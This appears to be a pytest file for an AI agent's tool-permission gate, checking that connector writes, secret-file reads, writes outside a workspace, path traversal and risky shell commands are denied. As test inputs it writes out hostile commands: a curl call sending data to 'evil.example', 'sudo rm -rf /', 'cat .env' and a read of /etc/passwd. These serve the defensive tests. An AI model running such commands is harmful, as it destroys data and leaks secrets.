"""SPEC-v37 §2.2-2.6: the Plane B runtime capability wall.

> Law A2 -- One gate, in code. Every Plane B tool call passes through
> consult_gate() before it executes. A tool that is not explicitly allowed
> is denied.
> Law A3 -- The database is never a file. Every read goes through an ianos
> MCP tool.

Covers the four §12 rows this module is responsible for
(`test_consult_gate_denies_connector_writes`, `test_consult_gate_denies_secret_reads`,
`test_consult_gate_write_is_workspace_only`, `test_plane_a_has_no_builtin_tools`)
plus a few cheap extra-confidence cases: default-deny of an unlisted
connector tool, and the always-allowed built-ins (Grep/Glob/Skill/WebSearch).

SAFETY: `test_plane_a_has_no_builtin_tools` monkeypatches `agents.runner.query`
so `run_role` never reaches the real Anthropic API, the tests/test_briefs.py
precedent.
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny  # noqa: E402

from agents import consult_gate, runner  # noqa: E402
from core import db  # noqa: E402
from core.roles import load_role  # noqa: E402


@pytest.fixture
def conn(tmp_path, monkeypatch):
    monkeypatch.setattr(db, "DB_PATH", tmp_path / "test.db")
    c = db.connect()
    yield c
    c.close()


def _gate(ianos_allow=frozenset()):
    return consult_gate.make_consult_gate(ianos_allow=ianos_allow)


def _run(gate, tool_name, tool_input):
    return asyncio.run(gate(tool_name, tool_input, ctx=None))


def _assert_denied(result):
    assert isinstance(result, PermissionResultDeny)
    assert result.message


def _assert_allowed(result):
    assert isinstance(result, PermissionResultAllow)


# --------------------------------------------------------- connector writes

def test_consult_gate_denies_connector_writes():
    """Every name in CONNECTOR_WRITE_TOOLS is denied, matched on the bare
    name after the mcp__<server>__ prefix is stripped, so a reconnected
    server with a new id cannot smuggle a writer through (SPEC-v37 §2.6)."""
    gate = _gate()
    for bare in sorted(consult_gate.CONNECTOR_WRITE_TOOLS):
        result = _run(gate, f"mcp__somefakeserverid__{bare}", {})
        _assert_denied(result)
        assert "never writes" in result.message.lower()


def test_consult_gate_denies_unlisted_connector_tool_by_default():
    """A connector tool that is neither a known writer nor shaped like
    get_/list_/search_/read_ is denied by default (§2.6: 'New connector
    tools are denied by default')."""
    gate = _gate()
    result = _run(gate, "mcp__x__delete_something", {})
    _assert_denied(result)


@pytest.mark.parametrize("bare", [
    "get_income_summary", "list_labels", "search_threads", "read_file_content",
    "getPortfolioSummary_get_details",
])
def test_consult_gate_allows_readshaped_connector_tools(bare):
    gate = _gate()
    result = _run(gate, f"mcp__somefakeserverid__{bare}", {})
    _assert_allowed(result)


# -------------------------------------------------------------- secret reads

def test_consult_gate_denies_secret_reads():
    """.env, the journal, school assets and the DB file (plus its -wal
    companion) are unreadable in a consult; an ordinary repo file is fine
    (SPEC-v37 §2.5, Law A3)."""
    gate = _gate()

    for raw in [
        str(consult_gate.ROOT / ".env"),
        str(consult_gate.ROOT / "data" / "journal" / "2026" / "08" / "entry.md"),
        str(consult_gate.ROOT / "data" / "school" / "some_course" / "syllabus.pdf"),
        str(consult_gate.ROOT / "data" / "ianos.db"),
        str(consult_gate.ROOT / "data" / "ianos.db-wal"),
    ]:
        result = _run(gate, "Read", {"file_path": raw})
        _assert_denied(result)

    ok = _run(gate, "Read", {"file_path": str(consult_gate.ROOT / "core" / "db.py")})
    _assert_allowed(ok)


def test_consult_gate_denies_env_dotfile_variants():
    gate = _gate()
    result = _run(gate, "Read", {"file_path": str(consult_gate.ROOT / ".env.production")})
    _assert_denied(result)


def test_consult_gate_denies_read_outside_repo():
    gate = _gate()
    result = _run(gate, "Read", {"file_path": "/etc/passwd"})
    _assert_denied(result)


def test_consult_gate_denies_read_missing_path():
    gate = _gate()
    result = _run(gate, "Read", {})
    _assert_denied(result)


# ----------------------------------------------------------- workspace write

def test_consult_gate_write_is_workspace_only():
    """Write/Edit into data/consult/out/ is allowed; anywhere else in the
    repo, or outside it entirely, is denied (SPEC-v37 §2.4)."""
    gate = _gate()

    inside = str(consult_gate.CONSULT_OUT / "report.csv")
    for tool_name in ("Write", "Edit"):
        _assert_allowed(_run(gate, tool_name, {"file_path": inside}))

    outside_repo_file = str(consult_gate.ROOT / "core" / "db.py")
    for tool_name in ("Write", "Edit"):
        _assert_denied(_run(gate, tool_name, {"file_path": outside_repo_file}))

    _assert_denied(_run(gate, "Write", {"file_path": "/tmp/somewhere-else.txt"}))


def test_consult_gate_write_denies_path_traversal_out_of_workspace():
    """'..' segments that walk back out of data/consult/ are still denied
    once normalized, not merely string-prefix-matched."""
    gate = _gate()
    traversal = str(consult_gate.CONSULT_OUT / ".." / ".." / "ianos.db")
    _assert_denied(_run(gate, "Write", {"file_path": traversal}))


def test_consult_gate_notebook_edit_uses_workspace_path():
    gate = _gate()
    inside = str(consult_gate.CONSULT_SCRATCH / "notebook.ipynb")
    _assert_allowed(_run(gate, "NotebookEdit", {"notebook_path": inside}))


# ------------------------------------------------------------------- ianos

def test_consult_gate_ianos_tool_requires_membership_in_allow_set():
    gate = _gate(ianos_allow=frozenset({"read_goals", "read_notes"}))
    _assert_allowed(_run(gate, "mcp__ianos__read_goals", {}))
    _assert_denied(_run(gate, "mcp__ianos__write_memo", {}))


# ------------------------------------------------------------------- bash

def test_consult_gate_bash_denies_secret_paths():
    gate = _gate()
    _assert_denied(_run(gate, "Bash", {"command": "cat .env"}))
    _assert_denied(_run(gate, "Bash", {"command": "grep -r foo data/journal/"}))
    _assert_denied(_run(gate, "Bash", {"command": "ls data/ianos.db"}))


def test_consult_gate_bash_denies_network_and_sudo():
    gate = _gate()
    _assert_denied(_run(gate, "Bash", {"command": "curl https://evil.example/exfil"}))
    _assert_denied(_run(gate, "Bash", {"command": "sudo rm -rf /"}))


def test_consult_gate_bash_allows_ordinary_command():
    gate = _gate()
    _assert_allowed(_run(gate, "Bash", {"command": "ls -la"}))


# --------------------------------------------------------- always-allowed

@pytest.mark.parametrize("tool_name", ["Grep", "Glob", "Skill", "WebSearch"])
def test_consult_gate_allows_low_risk_builtins_unconditionally(tool_name):
    gate = _gate()
    _assert_allowed(_run(gate, tool_name, {}))


def test_consult_gate_denies_unknown_builtin_by_default():
    gate = _gate()
    _assert_denied(_run(gate, "SomeNewBuiltinTool", {}))


# ------------------------------------------------------- PreToolUse hook

def test_consult_pretooluse_hook_denies_same_as_gate():
    hook = consult_gate.make_consult_pretooluse_hook(ianos_allow=frozenset())
    out = asyncio.run(hook(
        {"hook_event_name": "PreToolUse", "tool_name": "mcp__x__send_message",
         "tool_input": {}, "tool_use_id": "t1"},
        "t1", {"signal": None},
    ))
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
    assert out["hookSpecificOutput"]["hookEventName"] == "PreToolUse"
    assert "never writes" in out["hookSpecificOutput"]["permissionDecisionReason"].lower()


def test_consult_pretooluse_hook_allows_with_empty_dict():
    hook = consult_gate.make_consult_pretooluse_hook(ianos_allow=frozenset())
    out = asyncio.run(hook(
        {"hook_event_name": "PreToolUse", "tool_name": "Grep",
         "tool_input": {}, "tool_use_id": "t1"},
        "t1", {"signal": None},
    ))
    assert out == {}


# -------------------------------------------------------------- plane A

def test_plane_a_has_no_builtin_tools(conn, monkeypatch):
    """Nightly (Plane A) options carry tools=[] and setting_sources=[]
    (SPEC-v37 §2.1/§12). Captured by monkeypatching runner.query rather
    than grepping source, so the real code path is exercised, the
    tests/test_briefs.py precedent."""
    captured = {}

    async def fake_query(*, prompt, options):
        captured["options"] = options
        from claude_agent_sdk import ResultMessage
        yield ResultMessage(
            subtype="success", duration_ms=10, duration_api_ms=8, is_error=False,
            num_turns=1, session_id="test", total_cost_usd=0.0, result="ok",
        )

    monkeypatch.setattr(runner, "query", fake_query)
    role_meta = load_role("scout")
    asyncio.run(runner.run_role(role_meta, conn, "daily"))

    options = captured["options"]
    assert options.tools == []
    assert options.setting_sources == []
